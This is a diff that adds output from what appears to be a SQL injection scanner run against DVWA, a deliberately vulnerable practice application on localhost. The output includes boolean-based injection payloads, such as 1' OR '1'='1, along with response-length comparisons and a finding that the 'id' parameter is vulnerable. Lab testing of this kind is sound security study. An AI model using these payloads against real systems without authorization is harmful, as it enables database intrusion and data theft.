@@ -1,3 +1,37 @@
+[+] DVWA SQL Injection Scanner Started
+
+[*] Scanning Target:
+    http://127.0.0.1/dvwa/vulnerabilities/sqli/
+
+[*] Authentication:
+    Session cookie detected
+    Security level: LOW
+
+[*] Form Analysis:
+    Form method: GET
+    Input parameter detected: id
+
+[*] Testing SQL Injection payloads...
+    [+] Payload (TRUE condition):
+        1' OR '1'='1
+    [+] Payload (FALSE condition):
+        1' AND '1'='2
+
+[*] Response Analysis:
+    TRUE response length  : 4921 bytes
+    FALSE response length : 311 bytes
+    Difference detected   : YES
+
+[!!! SQL INJECTION VULNERABILITY FOUND !!!]
+
+    Vulnerable URL  : http://127.0.0.1/dvwa/vulnerabilities/sqli/
+    Parameter       : id
+    Injection Type  : Boolean-based SQL Injection
+    Proof Payload   : 1' OR '1'='1
+
+[+] Scan completed successfully
+[+] Report saved as: dvwa_sqli_report.txt
+
 =====================================
 DVWA SQL Injection Scan Report
 =====================================
